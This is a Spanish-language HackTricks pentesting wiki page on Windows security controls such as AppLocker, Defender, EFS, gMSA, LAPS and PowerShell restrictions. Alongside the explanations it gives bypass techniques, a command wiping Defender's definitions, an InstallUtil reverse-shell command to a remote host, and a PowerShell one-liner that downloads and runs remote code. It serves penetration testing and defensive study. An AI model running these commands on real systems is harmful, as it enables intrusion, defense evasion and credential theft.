# Controles de seguridad de Windows

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

![](<../.gitbook/assets/image (9) (1) (2).png>)

Utiliza [**Trickest**](https://trickest.com/?utm_campaign=hacktrics\&utm_medium=banner\&utm_source=hacktricks) para construir y **automatizar flujos de trabajo** con las herramientas de la comunidad más avanzadas del mundo.\
Obtén acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Política de AppLocker

Una lista blanca de aplicaciones es una lista de aplicaciones o ejecutables de software aprobados que se permiten estar presentes y ejecutarse en un sistema. El objetivo es proteger el entorno de malware dañino y software no aprobado que no se alinea con las necesidades comerciales específicas de una organización.&#x20;

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) es la solución de **lista blanca de aplicaciones** de Microsoft y da a los administradores del sistema control sobre **qué aplicaciones y archivos pueden ejecutar los usuarios**. Proporciona **control granular** sobre ejecutables, scripts, archivos de instalación de Windows, DLL, aplicaciones empaquetadas e instaladores de aplicaciones empaquetadas. \
Es común que las organizaciones **bloqueen cmd.exe y PowerShell.exe** y el acceso de escritura a ciertos directorios, **pero todo esto puede ser evadido**.

### Verificación

Verifica qué archivos/extensiones están en la lista negra/lista blanca:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Las reglas de AppLocker aplicadas a un host también se pueden **leer desde el registro local** en **`HKLM\Software\Policies\Microsoft\Windows\SrpV2`**.

### Bypass

* Carpetas **escribibles** útiles para eludir la política de AppLocker: Si AppLocker permite ejecutar cualquier cosa dentro de `C:\Windows\System32` o `C:\Windows`, hay **carpetas escribibles** que se pueden usar para **eludir esto**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* Los binarios comúnmente **confiables** de [**"LOLBAS"**](https://lolbas-project.github.io/) también pueden ser útiles para evadir AppLocker.
* Las reglas **mal escritas** también pueden ser evadidas
  * Por ejemplo, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, puedes crear una **carpeta llamada `allowed`** en cualquier lugar y será permitida.
  * Las organizaciones a menudo se centran en **bloquear el ejecutable `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, pero se olvidan de las **otras** [**ubicaciones de ejecutables de PowerShell**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) como `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` o `PowerShell_ISE.exe`.
* La aplicación de **DLLs muy raramente habilitada** debido a la carga adicional que puede poner en un sistema y la cantidad de pruebas necesarias para asegurarse de que nada se rompa. Por lo tanto, el uso de **DLLs como puertas traseras ayudará a evadir AppLocker**.
* Puedes usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **ejecutar código de Powershell** en cualquier proceso y evadir AppLocker. Para obtener más información, consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Almacenamiento de credenciales

### Security Accounts Manager (SAM)

Las credenciales locales están presentes en este archivo, las contraseñas están cifradas.

### Autoridad de seguridad local (LSA) - LSASS

Las **credenciales** (cifradas) se **guardan** en la **memoria** de este subsistema por razones de inicio de sesión único.\
**LSA** administra la **política de seguridad** local (política de contraseñas, permisos de usuarios...), **autenticación**, **tokens de acceso**...\
LSA será el que **verifique** las credenciales proporcionadas dentro del archivo **SAM** (para un inicio de sesión local) y **hable** con el **controlador de dominio** para autenticar a un usuario de dominio.

Las **credenciales** se **guardan** dentro del proceso LSASS: tickets Kerberos, hashes NT y LM, contraseñas fácilmente descifrables.

### Secretos de LSA

LSA podría guardar en disco algunas credenciales:

* Contraseña de la cuenta de equipo del Active Directory (controlador de dominio inaccesible).
* Contraseñas de las cuentas de los servicios de Windows
* Contraseñas para tareas programadas
* Más (contraseña de aplicaciones de IIS...)

### NTDS.dit

Es la base de datos del Active Directory. Solo está presente en los controladores de dominio.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) **** es un antivirus que está disponible en Windows 10 y Windows 11, y en versiones de Windows Server. **Bloquea** herramientas comunes de pentesting como **`WinPEAS`**. Sin embargo, hay formas de **evadir estas protecciones**.&#x20;

### Comprobar

Para comprobar el **estado** de **Defender** puedes ejecutar el cmdlet de PS **`Get-MpComputerStatus`** (comprueba el valor de **`RealTimeProtectionEnabled`** para saber si está activo):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :</code></pre>

Para enumerarlo también podrías ejecutar:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## EFS (Sistema de archivos cifrado)

EFS funciona cifrando un archivo con una **clave simétrica** a granel, también conocida como la Clave de Cifrado de Archivo o **FEK**. La FEK se **cifra** con una **clave pública** que está asociada con el usuario que cifró el archivo, y esta FEK cifrada se almacena en el **flujo de datos alternativo** $EFS del archivo cifrado. Para descifrar el archivo, el controlador de componente EFS utiliza la **clave privada** que coincide con el certificado digital EFS (utilizado para cifrar el archivo) para descifrar la clave simétrica que se almacena en el flujo $EFS. Desde [aquí](https://en.wikipedia.org/wiki/Encrypting\_File\_System).

Ejemplos de archivos que se descifran sin que el usuario lo solicite:

* Los archivos y carpetas se descifran antes de copiarse en un volumen formateado con otro sistema de archivos, como [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table).
* Los archivos cifrados se copian a través de la red utilizando el protocolo SMB/CIFS, los archivos se descifran antes de ser enviados por la red.

Los archivos cifrados utilizando este método pueden ser **accedidos de manera transparente por el usuario propietario** (quien los ha cifrado), por lo que si puedes **convertirte en ese usuario**, puedes descifrar los archivos (cambiar la contraseña del usuario e iniciar sesión como él no funcionará).

### Ver información de EFS

Verifique si un **usuario** ha **utilizado** este **servicio** verificando si existe esta ruta: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

Ver **quién** tiene **acceso** al archivo usando cipher /c \<file>\
También puede usar `cipher /e` y `cipher /d` dentro de una carpeta para **cifrar** y **descifrar** todos los archivos.

### Descifrando archivos EFS

#### Siendo el sistema de autoridad

Este método requiere que el **usuario víctima** esté **ejecutando** un **proceso** dentro del host. Si ese es el caso, usando una sesión de `meterpreter`, puedes suplantar el token del proceso del usuario (`impersonate_token` de `incognito`). O simplemente puedes `migrar` al proceso del usuario.

#### Conociendo la contraseña del usuario

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Cuentas de servicio administradas por grupos (gMSA)

En la mayoría de las infraestructuras, las cuentas de servicio son cuentas de usuario típicas con la opción "**La contraseña nunca caduca**". Mantener estas cuentas podría ser un verdadero desastre y es por eso que Microsoft introdujo las **Cuentas de Servicio Administradas:**

* No más gestión de contraseñas. Utiliza una contraseña compleja, aleatoria y de 240 caracteres que cambia automáticamente cuando alcanza la fecha de caducidad de la contraseña del dominio o del equipo.
  * Utiliza el Servicio de Distribución de Claves (KDC) de Microsoft para crear y administrar las contraseñas para la gMSA.
* No se puede bloquear ni utilizar para iniciar sesión interactivo.
* Admite compartir en varios hosts.
* Se puede utilizar para ejecutar tareas programadas (las cuentas de servicio administradas no admiten la ejecución de tareas programadas).
* Gestión simplificada de SPN: el sistema cambiará automáticamente el valor de SPN si los detalles de **sAMaccount** del equipo cambian o si cambia la propiedad del nombre DNS.

Las cuentas gMSA tienen sus contraseñas almacenadas en una propiedad LDAP llamada _**msDS-ManagedPassword**_, que se **restablece automáticamente** por los DC cada 30 días, son **recuperables** por los **administradores autorizados** y por los **servidores** en los que están instalados. _**msDS-ManagedPassword**_ es un bloque de datos cifrados llamado [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) y solo se puede recuperar cuando la conexión está asegurada, **LDAPS** o cuando el tipo de autenticación es "Sellado y seguro", por ejemplo.

![Imagen de https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

Por lo tanto, si se utiliza gMSA, averigüe si tiene **privilegios especiales** y también verifique si tiene **permisos** para **leer** la contraseña de los servicios.

Puede leer esta contraseña con [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
Además, revisa esta [página web](https://cube0x0.github.io/Relaying-for-gMSA/) sobre cómo realizar un ataque de relé NTLM para **leer** la **contraseña** de **gMSA**.

## LAPS

****[**Local Administrator Password Solution (LAPS)**](https://www.microsoft.com/en-us/download/details.aspx?id=46899) te permite **administrar la contraseña del administrador local** (que es **aleatoria**, única y **cambiada regularmente**) en computadoras unidas al dominio. Estas contraseñas se almacenan centralmente en Active Directory y se restringen a usuarios autorizados mediante ACL. Si se te otorgan suficientes permisos, podrías ser capaz de leer las contraseñas de los administradores locales.

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## Modo de lenguaje restringido de PS

El ****[**Modo de lenguaje restringido de PowerShell**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **bloquea muchas de las características** necesarias para usar PowerShell de manera efectiva, como bloquear objetos COM, permitir solo tipos .NET aprobados, flujos de trabajo basados en XAML, clases de PowerShell y más.

### **Comprobar**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```powershell
#Easy bypass
Powershell -version 2
```
En la versión actual de Windows, el Bypass no funcionará, pero se puede utilizar [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).

**Para compilarlo, es posible que necesite** **agregar una referencia** -> _Examinar_ -> _Examinar_ -> agregar `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` y **cambiar el proyecto a .Net4.5**.

#### Bypass directo:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Shell inversa:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Puedes usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **ejecutar código Powershell** en cualquier proceso y evitar el modo restringido. Para obtener más información, consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Política de ejecución de PS

Por defecto, está establecida en **restringida**. Las principales formas de evitar esta política son:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
## Interfaz de proveedor de soporte de seguridad (SSPI)

Es la API que se puede utilizar para autenticar usuarios.

El SSPI se encargará de encontrar el protocolo adecuado para dos máquinas que desean comunicarse. El método preferido para esto es Kerberos. Luego, el SSPI negociará qué protocolo de autenticación se utilizará, estos protocolos de autenticación se llaman proveedores de soporte de seguridad (SSP), se encuentran dentro de cada máquina con Windows en forma de una DLL y ambas máquinas deben admitir lo mismo para poder comunicarse.

### Principales SSP

* **Kerberos**: el preferido
  * %windir%\Windows\System32\kerberos.dll
* **NTLMv1** y **NTLMv2**: por razones de compatibilidad
  * %windir%\Windows\System32\msv1\_0.dll
* **Digest**: servidores web y LDAP, contraseña en forma de hash MD5
  * %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL y TLS
  * %windir%\Windows\System32\Schannel.dll
* **Negotiate**: se utiliza para negociar el protocolo a utilizar (Kerberos o NTLM, siendo Kerberos el predeterminado)
  * %windir%\Windows\System32\lsasrv.dll

#### La negociación podría ofrecer varios métodos o solo uno.

## UAC - Control de cuentas de usuario

[Control de cuentas de usuario (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una función que permite una **solicitud de consentimiento para actividades elevadas**.&#x20;

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}



![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Utilice [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para crear y **automatizar flujos de trabajo** con las herramientas de la comunidad más avanzadas del mundo.\
Obtenga acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabaja en una **empresa de ciberseguridad**? ¿Quiere ver su **empresa anunciada en HackTricks**? ¿O quiere tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulte los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenga el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únase al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígame** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparta sus trucos de hacking enviando PR al [repositorio hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
